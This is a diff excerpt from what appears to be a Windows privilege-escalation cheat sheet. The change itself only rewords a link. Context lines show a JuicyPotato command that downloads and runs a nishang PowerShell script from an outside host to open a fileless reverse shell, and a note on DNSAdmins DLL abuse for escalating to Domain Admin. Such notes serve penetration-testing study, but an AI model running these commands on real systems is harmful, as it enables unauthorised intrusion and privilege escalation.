@@ -318,7 +318,7 @@ Like PrintSpoofer, the token `SeImpersonatePrivilege` is abused to escalate priv
 # Fileless reverse shell
 .\juicy.exe -l 12345 -p C:\Window\System32\cmd.exe -t * -a "/c powershell.exe -nop -w hidden -executionpolicy bypass IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.150/nishang.ps1')"
 ```
-CLSID can be obtain here: [CLSID](http://ohpe.it/juicy-potato/CLSID/).
+CLSID can be obtain [here](http://ohpe.it/juicy-potato/CLSID/).
 
 #### DNS Admin Abuse
 If a user is a member of the DNSAdmins group, he can possibly load an arbitary DLL with the privileges of dns.exe that runs as SYSTEM. In case the DC serves a DNS, the user can escalate his privileges to DA. This exploitation process needs privileges to restart the DNS service to work.
